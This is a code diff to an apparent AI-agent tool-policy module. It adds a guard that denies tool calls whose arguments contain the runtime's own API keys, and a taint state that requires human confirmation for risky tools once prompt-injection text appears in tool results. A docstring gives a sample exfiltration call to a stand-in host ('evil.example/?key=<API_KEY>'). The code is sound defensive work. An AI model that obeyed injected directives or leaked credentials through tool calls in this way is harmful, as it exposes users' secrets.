@@ -305,6 +305,35 @@ def evaluate_path_safety(arguments: dict[str, Any]) -> tuple[bool, str]:
     return True, ""
 
 
+# --- Secret-exfiltration guard (Context Taint firewall, v2.1.5) ------------------
+
+_MIN_SECRET_CHARS = 8
+
+
+def arguments_contain_secret(arguments: Any, secrets: tuple[str, ...]) -> bool:
+    """True when any string leaf of the tool arguments embeds a configured secret.
+
+    Legitimate tool arguments never contain the runtime's own API keys or auth
+    token, so a hit means injected content is trying to exfiltrate credentials
+    through a tool call (e.g. ``fetch_url`` to ``evil.example/?key=<API_KEY>``).
+    Secrets shorter than ``_MIN_SECRET_CHARS`` are ignored to avoid false hits.
+    """
+    real_secrets = tuple(secret for secret in secrets if len(str(secret or "")) >= _MIN_SECRET_CHARS)
+    if not real_secrets:
+        return False
+
+    def walk(node: Any) -> bool:
+        if isinstance(node, str):
+            return any(secret in node for secret in real_secrets)
+        if isinstance(node, dict):
+            return any(walk(value) for value in node.values())
+        if isinstance(node, list):
+            return any(walk(item) for item in node)
+        return False
+
+    return walk(arguments)
+
+
 # --- Prompt-injection sanitization of tool results ------------------------------
 
 # Unambiguous override directives commonly used to hijack an agent from inside
@@ -429,6 +458,9 @@ class ToolPolicy:
         sanitize: bool | None = None,
         audit: bool | None = None,
         scope: str = "global",
+        secrets: tuple[str, ...] = (),
+        tainted: bool = False,
+        taint_escalation: bool = False,
     ) -> None:
         self.capability = str(capability or "full")
         if allowed_tools is not None:
@@ -444,12 +476,20 @@ class ToolPolicy:
         self.sanitize = TOOL_POLICY_SANITIZE_RESULTS if sanitize is None else bool(sanitize)
         self.audit = TOOL_POLICY_AUDIT_ENABLED if audit is None else bool(audit)
         self.scope = str(scope or "global")
+        # Context Taint firewall (v2.1.5): the runtime's own credentials (never
+        # legitimate inside tool arguments) and whether this turn's context
+        # carried injection directives. A tainted turn puts high-risk /
+        # sensitive-sink tools behind explicit confirmation when escalation is on.
+        self.secrets = tuple(str(item) for item in secrets if str(item or ""))
+        self.taint_escalation = bool(taint_escalation)
         self._lock = threading.Lock()
+        self.tainted = bool(tainted)
         self.evaluated = 0
         self.allowed_count = 0
         self.denied = 0
         self.confirmations = 0
         self.sanitized_hits = 0
+        self.secret_blocks = 0
         self.blocked_tools: list[str] = []
 
     # -- classmethods ------------------------------------------------------------
@@ -502,10 +542,29 @@ class ToolPolicy:
             if is_sensitive_memory(str(args.get("content") or "")):
                 reasons.append("sensitive_memory_blocked")
                 return self._record(PolicyDecision(tool, DENY, "high", tuple(reasons), tuple(violations), self.capability))
+        # Secret exfiltration (Context Taint firewall): the runtime's own
+        # credentials never belong in tool arguments — an unconditional block.
+        if self.secrets and arguments_contain_secret(args, self.secrets):
+            reasons.append("secret_exfiltration_blocked")
+            with self._lock:
+                self.secret_blocks += 1
+            return self._record(PolicyDecision(tool, DENY, "critical", tuple(reasons), tuple(violations), self.capability))
 
         # 4. Human confirmation for high-risk tools.
         if self.require_confirm and meta.requires_confirm and tool not in self.approvals:
             reasons.append("requires_confirmation")
+            return self._record(PolicyDecision(tool, NEEDS_CONFIRMATION, _max_risk(risk, "high"), tuple(reasons), tuple(violations), self.capability))
+
+        # 5. Taint escalation: when this turn's context carried injection /
+        # exfiltration / tool directives from untrusted sources, dangerous tools
+        # wait for an explicit approval instead of running silently.
+        if (
+            self.taint_escalation
+            and self.is_tainted
+            and tool not in self.approvals
+            and (meta.requires_confirm or meta.sensitive_sink or RISK_ORDER.get(meta.risk, 0) >= RISK_ORDER["high"])
+        ):
+            reasons.append("taint_escalated_confirmation")
             return self._record(PolicyDecision(tool, NEEDS_CONFIRMATION, _max_risk(risk, "high"), tuple(reasons), tuple(violations), self.capability))
 
         if violations:
@@ -527,6 +586,17 @@ class ToolPolicy:
             write_audit_entry(decision, scope=self.scope)
         return decision
 
+    # -- taint state ---------------------------------------------------------------
+
+    @property
+    def is_tainted(self) -> bool:
+        with self._lock:
+            return self.tainted
+
+    def mark_tainted(self) -> None:
+        with self._lock:
+            self.tainted = True
+
     # -- result sanitization -----------------------------------------------------
 
     def sanitize_result(self, name: str, output: dict[str, Any]) -> dict[str, Any]:
@@ -536,6 +606,9 @@ class ToolPolicy:
         if hits:
             with self._lock:
                 self.sanitized_hits += hits
+                # Injection directives arrived mid-turn through a tool result:
+                # treat the rest of the turn as tainted (defense in depth).
+                self.tainted = True
         return cleaned
 
     # -- denial output -----------------------------------------------------------
@@ -569,6 +642,8 @@ class ToolPolicy:
                 "denied": self.denied,
                 "confirmations": self.confirmations,
                 "sanitizedInjections": self.sanitized_hits,
+                "secretBlocks": self.secret_blocks,
+                "tainted": self.tainted,
                 "blockedTools": sorted(set(self.blocked_tools)),
             }
 
